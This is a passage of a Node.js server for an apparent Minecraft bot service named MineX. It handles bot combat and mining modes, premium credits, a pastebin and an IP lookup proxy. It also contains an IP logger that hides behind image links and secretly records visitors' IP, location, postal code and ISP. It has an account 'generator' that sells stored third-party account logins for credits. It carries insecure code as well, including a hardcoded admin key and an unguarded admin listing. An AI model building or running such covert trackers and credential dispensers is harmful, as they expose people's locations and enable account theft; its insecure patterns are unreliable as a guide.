        const user = await User.findOne({ username: req.user.username });
        if (!user) return res.json({ success: false, error: 'User not found' });

        // Check if already covered by premium
        const isPremium = user.premiumUntil && user.premiumUntil > Date.now();
        const tier = isPremium ? (user.premiumTier || 1) : 0;

        const coveredByTier1 = tier >= 1 && TIER_1_MODES.includes(mode);
        const coveredByTier2 = tier >= 2 && (TIER_1_MODES.includes(mode) || TIER_2_MODES.includes(mode));

        if (coveredByTier1 || coveredByTier2 || user.unlockedModes?.includes(mode)) {
            return res.json({ success: false, error: 'Mode already unlocked' });
        }

        const cost = MODE_COSTS[mode] || 100;
        if ((user.credits || 0) < cost) {
            return res.json({ success: false, error: `Insufficient credits. Unlock costs ${cost} credits.` });
        }

        user.credits -= cost;
        if (!user.unlockedModes) user.unlockedModes = [];
        user.unlockedModes.push(mode);
        await user.save();

        res.json({ success: true, message: `${mode} mode unlocked!`, credits: user.credits, unlockedModes: user.unlockedModes });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Get Subscription Status
app.get('/api/bot/subscription', requireAuth, async (req, res) => {
    try {
        const user = await User.findOne({ username: req.user.username });
        const isPremium = user.premiumUntil && user.premiumUntil > Date.now();
        res.json({ success: true, isPremium, premiumTier: user.premiumTier || 0, premiumUntil: user.premiumUntil });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Admin: Grant Premium Manually
app.post('/api/admin/grant-premium', requireAuth, async (req, res) => {
    const { targetUsername, durationDays = 30, tier = 1, adminKey } = req.body;

    // Simple Admin Key Check (In production, use env var or proper role auth)
    if (adminKey !== 'minex-admin-secret') {
        return res.json({ success: false, error: 'Invalid Admin Key' });
    }

    try {
        const user = await User.findOne({ username: targetUsername });
        if (!user) return res.json({ success: false, error: 'Target user not found' });

        // Apply subscription
        const currentExpiry = (user.premiumUntil > Date.now()) ? user.premiumUntil : Date.now();
        const newExpiry = new Date(currentExpiry);
        newExpiry.setDate(newExpiry.getDate() + parseInt(durationDays));

        user.premiumUntil = newExpiry.getTime();
        user.premiumTier = parseInt(tier); // 1 = Silver, 2 = Gold

        await user.save();

        res.json({
            success: true,
            message: `Premium granted to ${targetUsername} (Tier ${tier}) until ${newExpiry.toLocaleDateString()}`
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// User: Buy Silver Premium with Credits (14 days, 250 credits)
app.post('/api/user/buy-premium', requireAuth, async (req, res) => {
    try {
        const user = await User.findOne({ username: req.user.username });
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });

        const cost = 250;
        if ((user.credits || 0) < cost) {
            return res.json({ success: false, error: 'Not enough credits (Requires 250)' });
        }

        user.credits -= cost;

        const currentExpiry = (user.premiumUntil && user.premiumUntil > Date.now()) ? user.premiumUntil : Date.now();
        const newExpiry = new Date(currentExpiry);
        newExpiry.setDate(newExpiry.getDate() + 14);

        user.premiumUntil = newExpiry.getTime();
        if (!user.premiumTier || user.premiumTier < 1) {
            user.premiumTier = 1;
        }

        await user.save();
        res.json({ success: true, message: 'Successfully purchased Silver (14d)', credits: user.credits });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Toggle a premium mode on/off
app.post('/api/bot/modes/toggle', requireAuth, async (req, res) => {
    const { mode, enabled, options } = req.body; // options can contain targetPlayer or skinName
    const userId = req.user.id;

    if (!PREMIUM_MODES.includes(mode)) {
        return res.json({ success: false, error: 'Invalid mode' });
    }

    try {
        const user = await User.findOne({ username: req.user.username });
        const isPremium = user.premiumUntil && user.premiumUntil > Date.now();
        const tier = isPremium ? (user.premiumTier || 0) : 0;

        const coveredByTier1 = tier >= 1 && TIER_1_MODES.includes(mode);
        const coveredByTier2 = tier >= 2 && (TIER_1_MODES.includes(mode) || TIER_2_MODES.includes(mode));
        const isUnlocked = user?.unlockedModes?.includes(mode);

        if (!isPremium && !isUnlocked) {
            return res.json({ success: false, error: 'Mode not unlocked. Unlock it first!' });
        }

        if (isPremium && !coveredByTier1 && !coveredByTier2 && !isUnlocked) {
            // User is premium but this mode isn't in their tier (e.g. Silver user trying Follow mode)
            return res.json({ success: false, error: `This mode requires Gold Tier or individual unlock.` });
        }

        const botRecord = await Bot.findOne({ userId });
        if (!botRecord) return res.json({ success: false, error: 'No bot found' });

        const runtimeBot = activeBots.get(botRecord.sessionId);
        if (!runtimeBot) return res.json({ success: false, error: 'Bot is offline. Start it first.' });

        // Store active mode in the bot's internal state
        if (!runtimeBot._premiumModes) runtimeBot._premiumModes = {};

        if (enabled) {
            // Enable the mode
            switch (mode) {
                case 'attack':
                    if (runtimeBot._attackInterval) clearInterval(runtimeBot._attackInterval);

                    // Pro PvP State
                    runtimeBot._pvpStrafeDir = 'left';
                    setInterval(() => {
                        runtimeBot._pvpStrafeDir = (Math.random() > 0.5) ? 'left' : 'right';
                    }, 1500); // Random Strafe Switch

                    runtimeBot._attackInterval = setInterval(async () => {
                        // 1. Equip Weapon
                        const hasWeapon = await equipBestTool(runtimeBot, 'weapon');
                        if (!hasWeapon) {
                            const now = Date.now();
                            if (!runtimeBot._lastToolRequest || (now - runtimeBot._lastToolRequest > 30000)) {
                                runtimeBot.chat("I need a sword or axe to fight!");
                                runtimeBot._lastToolRequest = now;
                            }
                        }

                        // 2. Find Target (Player/Hostile)
                        const target = runtimeBot.nearestEntity(e => (e.type === 'player' && e.username !== runtimeBot.username) || e.type === 'hostile');

                        // 3. Combat Logic
                        if (target && runtimeBot.entity.position.distanceTo(target.position) < 20) {
                            const dist = runtimeBot.entity.position.distanceTo(target.position);

                            // Look at target (slightly upward for headshots/crits)
                            runtimeBot.lookAt(target.position.offset(0, target.height * 0.85, 0));

                            if (dist > 3.5) {
                                // CHASE: Sprint Jump
                                runtimeBot.setControlState('forward', true);
                                runtimeBot.setControlState('sprint', true);
                                runtimeBot.setControlState('jump', runtimeBot.entity.isCollidedHorizontally || runtimeBot.entity.isInWater);
                                // Reset combat states
                                runtimeBot.setControlState('sneak', false);
                            } else {
                                // COMBAT: Close Range
                                runtimeBot.setControlState('forward', true); // Keep pressure
                                runtimeBot.setControlState('sprint', false); // Optional: Stop sprint to avoid knocked back too far? keeping it simple

                                // Strafe
                                runtimeBot.setControlState(runtimeBot._pvpStrafeDir, true);
                                runtimeBot.setControlState((runtimeBot._pvpStrafeDir === 'left' ? 'right' : 'left'), false);

                                // CRIT: Jump while attacking
                                runtimeBot.setControlState('jump', true);

                                // Attack
                                runtimeBot.attack(target);
                            }
                        } else {
                            // No target / Idle
                            runtimeBot.clearControlStates();
                        }
                    }, 50); // Fast tick for smooth movement
                    runtimeBot._premiumModes.attack = true;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '⚔️ Pro PvP enabled: Chasing & Crits', timestamp: Date.now() });
                    break;

                case 'mining':
                    if (runtimeBot._miningInterval) clearInterval(runtimeBot._miningInterval);
                    runtimeBot._miningInterval = setInterval(async () => {
                        try {
                            // Equip Pickaxe
                            const hasPick = await equipBestTool(runtimeBot, 'mining');
                            if (!hasPick) {
                                const now = Date.now();
                                if (!runtimeBot._lastToolRequest || (now - runtimeBot._lastToolRequest > 30000)) {
                                    runtimeBot.chat("I need a pickaxe to mine properly!");
                                    runtimeBot._lastToolRequest = now;
                                }
                            }

                            if (runtimeBot.entity.velocity.y > -0.1) { // Only if not falling
                                const block = runtimeBot.findBlock({ matching: (b) => b.name.includes('ore') || b.name.includes('stone') || b.name.includes('log'), maxDistance: 4 });
                                if (block) await runtimeBot.dig(block);
                            }
                        } catch (e) { }
                    }, 1000);
                    runtimeBot._premiumModes.mining = true;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '⛏️ Mining mode enabled', timestamp: Date.now() });
                    break;

                case 'butcher':
                    if (runtimeBot._butcherInterval) clearInterval(runtimeBot._butcherInterval);
                    runtimeBot._butcherInterval = setInterval(async () => {
                        // Equip Weapon
                        await equipBestTool(runtimeBot, 'weapon'); // Silent check for butcher

                        const animals = ['cow', 'pig', 'sheep', 'chicken', 'rabbit'];
                        const nearestAnimal = runtimeBot.nearestEntity(e => animals.some(a => e.name?.toLowerCase().includes(a)));
                        if (nearestAnimal && runtimeBot.entity.position.distanceTo(nearestAnimal.position) < 4) {
                            runtimeBot.lookAt(nearestAnimal.position.offset(0, nearestAnimal.height * 0.5, 0));
                            runtimeBot.attack(nearestAnimal);
                        }
                    }, 500);
                    runtimeBot._premiumModes.butcher = true;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '🥩 Animal butcher mode enabled', timestamp: Date.now() });
                    break;

                case 'follow':
                    const targetName = options?.targetPlayer;
                    if (!targetName) return res.json({ success: false, error: 'Target player name required' });

                    if (runtimeBot._followInterval) clearInterval(runtimeBot._followInterval);
                    runtimeBot._followInterval = setInterval(() => {
                        const target = runtimeBot.players[targetName]?.entity;
                        if (!target) return;

                        const distance = runtimeBot.entity.position.distanceTo(target.position);
                        runtimeBot.lookAt(target.position.offset(0, target.height, 0));

                        if (distance > 2) {
                            runtimeBot.setControlState('forward', true);
                            if (runtimeBot.entity.isCollidedHorizontally) runtimeBot.setControlState('jump', true);
                            else runtimeBot.setControlState('jump', false);

                            // Simple water handling
                            if (runtimeBot.entity.isInWater) runtimeBot.setControlState('jump', true);

                            // Sprint if far (>4 blocks now)
                            runtimeBot.setControlState('sprint', distance > 4);
                        } else {
                            runtimeBot.clearControlStates();
                        }
                    }, 50); // Frequent updates for smooth movement
                    runtimeBot._premiumModes.follow = true;
                    io.to(botRecord.sessionId).emit('bot:message', { message: `👣 Following ${targetName}`, timestamp: Date.now() });
                    break;

                case 'skin':
                    // ... unchanged ...
                    const skinName = options?.skinName;
                    // ...
                    runtimeBot.chat(`/skin ${skinName}`);
                    io.to(botRecord.sessionId).emit('bot:message', { message: `🎨 Attempting to set skin to: ${skinName}`, timestamp: Date.now() });
                    runtimeBot._premiumModes.skin = true;
                    break;

                case 'drop_all':
                    if (runtimeBot._dropInterval) clearInterval(runtimeBot._dropInterval);
                    console.log(`[${botRecord.sessionId}] Auto-Drop started`);
                    runtimeBot._dropInterval = setInterval(async () => {
                        if (!runtimeBot || !runtimeBot.inventory) return;

                        // Get all non-empty items
                        const items = runtimeBot.inventory.items();
                        if (items.length === 0) return;

                        // Toss the first available item
                        const itemToDrop = items[0];
                        if (itemToDrop) {
                            try {
                                console.log(`[${botRecord.sessionId}] Dropping ${itemToDrop.name} x${itemToDrop.count}`);
                                await runtimeBot.tossStack(itemToDrop);
                            } catch (e) {
                                console.error(`[${botRecord.sessionId}] Drop failed: ${e.message}`);
                            }
                        }
                    }, 800); // 800ms interval to be safe
                    runtimeBot._premiumModes.drop_all = true;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '🗑️ Auto-Drop enabled', timestamp: Date.now() });
                    break;
            }
        } else {
            // Disable the mode
            switch (mode) {
                case 'attack':
                    if (runtimeBot._attackInterval) clearInterval(runtimeBot._attackInterval);
                    runtimeBot._premiumModes.attack = false;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '⚔️ Attack mode disabled', timestamp: Date.now() });
                    break;
                case 'mining':
                    if (runtimeBot._miningInterval) clearInterval(runtimeBot._miningInterval);
                    runtimeBot._premiumModes.mining = false;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '⛏️ Mining mode disabled', timestamp: Date.now() });
                    break;
                case 'butcher':
                    if (runtimeBot._butcherInterval) clearInterval(runtimeBot._butcherInterval);
                    runtimeBot._premiumModes.butcher = false;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '🥩 Animal butcher mode disabled', timestamp: Date.now() });
                    break;
                case 'follow':
                    if (runtimeBot._followInterval) clearInterval(runtimeBot._followInterval);
                    runtimeBot.clearControlStates();
                    runtimeBot._premiumModes.follow = false;
                    io.to(botRecord.sessionId).emit('bot:message', { message: '👣 Follow mode disabled', timestamp: Date.now() });
                    break;
                // Skin mode doesn't really have a 'disable' state unless we reset to default, but usually that's just setting skin to username
                case 'skin':
                    runtimeBot.chat(`/skin ${botRecord.username}`);
                    io.to(botRecord.sessionId).emit('bot:message', { message: '🎨 Skin reset to default', timestamp: Date.now() });
                    break;
            }
        }

        res.json({ success: true, mode, enabled, activeModes: runtimeBot._premiumModes });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ============= IP LOGGER ROUTES =============

app.post('/api/iplogger/create', authenticateToken, async (req, res) => {
    const { imageData, code: providedCode } = req.body;
    const code = providedCode || Math.random().toString(36).substring(2, 10);
    const logData = {
        code, // for Mongo
        userId: req.user ? req.user.id : null,
        imageData,
        createdAt: Date.now(),
        visitors: []
    };

    if (dbManager.status !== 'mongodb') {
        return res.json({ success: false, error: 'Database not connected' });
    }

    const log = new IpLog(logData);
    await log.save();
    res.json({ success: true, code, url: `/track/${code}` });
});

app.get('/track/:code', async (req, res) => {
    const { code } = req.params;
    let data;

    if (dbManager.status === 'mongodb') {
        data = await IpLog.findOne({ code });
    } else {
        return res.status(503).send('Database not connected');
    }

    if (!data) return res.status(404).send('Not found');

    // Get real IP (handle proxies)
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ip = rawIp.split(',')[0].trim(); // Take first IP if multiple

    let geoData = {};
    try {
        // Fetch location data (HTTP is fine server-side)
        const geoReq = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,isp,org,as,mobile,proxy,hosting,lat,lon`);
        const geo = await geoReq.json();
        if (geo.status === 'success') {
            geoData = {
                city: geo.city,
                region: geo.regionName,
                country: geo.country,
                postal: geo.zip,
                isp: geo.isp,
                org: geo.org,
                mobile: geo.mobile,
                proxy: geo.proxy,
                hosting: geo.hosting,
                lat: geo.lat,
                lon: geo.lon
            };
        }
    } catch (e) {
        console.error('Geo lookup failed:', e);
    }

    const visitorInfo = {
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        ip: ip, // Store clean IP
        userAgent: req.headers['user-agent'],
        referer: req.headers['referer'] || 'Direct',
        ...geoData // Spread geo fields
    };

    // Update visitors
    data.visitors.push(visitorInfo);
    if (data.visitors.length > 20) data.visitors = data.visitors.slice(-20); // Increase limit to 20

    if (dbManager.status === 'mongodb') {
        await IpLog.updateOne({ code }, { visitors: data.visitors });
    }

    if (data.imageData.startsWith('data:image')) {
        const base64Data = data.imageData.split(',')[1];
        const imgBuffer = Buffer.from(base64Data, 'base64');
        res.setHeader('Content-Type', 'image/jpeg');
        res.send(imgBuffer);
    } else {
        res.redirect(data.imageData);
    }
});

app.get('/api/iplogger/visitors/:code', async (req, res) => {
    const { code } = req.params;
    let data;
    if (dbManager.status === 'mongodb') {
        data = await IpLog.findOne({ code });
    } else {
        return res.json({ success: false, error: 'Database not connected' });
    }

    if (!data) return res.json({ success: false, error: 'Not found' });
    res.json({ success: true, visitors: data.visitors, createdAt: data.createdAt });
});

// ============= GENERATOR ROUTES =============

// Get Stock Count
app.get('/api/generator/:service/stock', async (req, res) => {
    const { service } = req.params;
    if (dbManager.status === 'mongodb') {
        const count = await Account.countDocuments({ service });
        res.json({ success: true, count });
    } else {
        res.json({ success: true, count: 0, error: 'Database required' });
    }
});

// Generate Account (Dispense one and remove)
// Generate Account (Dispense one and remove)
app.post('/api/generator/:service/generate', requireAuth, async (req, res) => {
    const { service } = req.params;
    // req.user populated by authenticateToken
    const username = req.user.username;

    if (dbManager.status !== 'mongodb') {
        return res.status(503).json({ success: false, error: 'Database not connected (MongoDB required for credits)' });
    }

    try {
        // 1. Find User & Check Credits
        const user = await User.findOne({ username });
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });

        const cost = 2;
        if ((user.credits || 0) < cost) {
            return res.json({ success: false, error: `Insufficient credits. You need ${cost} credits.` });
        }

        // 2. Check Stock & Get Account
        const account = await Account.findOneAndDelete({ service });
        if (!account) {
            return res.json({ success: false, error: 'Out of stock' });
        }

        // 3. Deduct Credits
        user.credits = (user.credits || 0) - cost;
        await user.save();

        // 4. Create Generated Link
        const linkId = Math.random().toString(36).substring(2, 12) + Math.random().toString(36).substring(2, 12);

        await new GeneratedLink({
            linkId,
            userId: user.id,
            service,
            data: account.data,
            createdAt: Date.now()
        }).save();

        res.json({ success: true, linkId, remainingCredits: user.credits });

    } catch (e) {
        console.error("Generation error:", e);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Get Generated Link (Idempotent View)
app.get('/api/generator/link/:linkId', requireAuth, async (req, res) => {
    const { linkId } = req.params;

    if (dbManager.status !== 'mongodb') {
        // Fallback or error
        return res.status(503).json({ success: false, error: 'Database not connected' });
    }

    try {
        const link = await GeneratedLink.findOne({ linkId });
        if (!link) return res.status(404).json({ success: false, error: 'Link not found' });

        // Return account data
        res.json({ success: true, data: link.data, service: link.service, date: link.createdAt });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Server Error' });
    }
});

// Add Accounts (Admin only - for now just protected by JWT)
app.post('/api/generator/:service/add', requireAuth, async (req, res) => {
    const { service } = req.params;
    const { accounts } = req.body; // Array of strings or single string (newline separated)

    if (!accounts) return res.json({ success: false, error: 'No accounts provided' });

    let accountList = [];
    if (Array.isArray(accounts)) {
        accountList = accounts;
    } else {
        accountList = accounts.split('\n').map(a => a.trim()).filter(a => a);
    }

    if (dbManager.status === 'mongodb') {
        const docs = accountList.map(data => ({
            service,
            data,
            addedAt: Date.now()
        }));
        await Account.insertMany(docs);
        res.json({ success: true, added: docs.length });
    } else {
        res.json({ success: false, error: 'Database required' });
    }
});

// Admin View Stock (List all accounts)
app.get('/api/generator/:service/check', requireAuth, async (req, res) => {
    const { service } = req.params;
    if (dbManager.status === 'mongodb') {
        // In real app check admin permissions here
        const accounts = await Account.find({ service }).select('data addedAt');
        res.json({ success: true, accounts });
    } else {
        res.json({ success: true, accounts: [], error: 'Database required' });
    }
});

// ============= PASTEBIN ROUTES =============

app.post('/api/paste/create', authenticateToken, async (req, res) => {
    const { title, content, language, expiresIn, password } = req.body;
    if (!content) return res.json({ success: false, error: 'Content required' });
    const code = Math.random().toString(36).substring(2, 10);

    // ... expiry logic (simplified for brevity, identical to before)
    let expiresAt = null; // Add logic if needed

    const pasteData = {
        code,
        userId: req.user ? req.user.id : null,
        title: title || 'Untitled',
        content,
        language: language || 'plaintext',
        createdAt: Date.now(),
        expiresAt,
        password: password || null,
        views: 0
    };

    if (dbManager.status !== 'mongodb') {
        return res.json({ success: false, error: 'Database not connected' });
    }
    await new Paste(pasteData).save();

    res.json({ success: true, code, url: `/paste/${code}`, hasPassword: !!password });
});

app.post('/api/paste/view/:code', async (req, res) => {
    const { code } = req.params;
    const { password } = req.body;
    let paste;

    if (dbManager.status === 'mongodb') {
        paste = await Paste.findOne({ code });
    } else {
        paste = memPastes.get(code);
    }

    if (!paste) return res.json({ success: false, error: 'Not found' });
    if (paste.password && paste.password !== password) return res.json({ success: false, error: 'Incorrect password', requiresPassword: true });

    if (dbManager.status === 'mongodb') {
        await Paste.updateOne({ code }, { $inc: { views: 1 } });
    } else {
        paste.views++;
    }

    res.json({ success: true, paste });
});

app.get('/api/paste/check/:code', async (req, res) => {
    const { code } = req.params;
    let paste;
    if (dbManager.status === 'mongodb') paste = await Paste.findOne({ code });
    else paste = memPastes.get(code);

    if (!paste) return res.json({ success: false, error: 'Not found' });
    res.json({ success: true, requiresPassword: !!paste.password, title: paste.title, language: paste.language });
});

app.get('/raw/:code', async (req, res) => {
    const { code } = req.params;
    let paste;
    if (dbManager.status === 'mongodb') paste = await Paste.findOne({ code });
    else paste = memPastes.get(code);

    if (!paste || paste.password) return res.status(404).send('Not found or locked');
    res.setHeader('Content-Type', 'text/plain');
    res.send(paste.content);
});

// Proxy for IP Lookup (Avoid Mixed Content)
app.get('/api/tools/ip-lookup/:ip?', async (req, res) => {
    const { ip } = req.params;
    const target = ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    try {
        const response = await fetch(`http://ip-api.com/json/${target}`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ status: 'fail', message: 'Server proxy failed' });
    }
});

// Socket.io
io.on('connection', (socket) => {
    socket.on('join:session', (id) => socket.join(id));

    socket.on('bot:control', ({ sessionId, action }) => {
        const bot = activeBots.get(sessionId);
        if (bot) {
            console.log(`[${sessionId}] Control: ${action}`);
            if (['jump', 'sprint', 'sneak', 'forward', 'back', 'left', 'right'].includes(action)) {
                bot.setControlState(action, true);
                setTimeout(() => bot.setControlState(action, false), 300); // Pulse control
            } else if (action === 'stop') {
                bot.clearControlStates();
            } else if (action === 'drop') {
                const heldItem = bot.inventory.slots[bot.getEquipmentDestSlot('hand')];
                if (heldItem) bot.tossStack(heldItem);
            }
        }
    });

    socket.on('bot:chat', ({ sessionId, message }) => {
        const bot = activeBots.get(sessionId);
        if (bot) bot.chat(message);
    });
});

// Start
const PORT = process.env.PORT || 3001;
server.listen(PORT, async () => {
    console.log(`MineX Server running on port ${PORT}`);

    // Auto-connect to default MongoDB if configured
    await dbManager.initializeDefault();
});
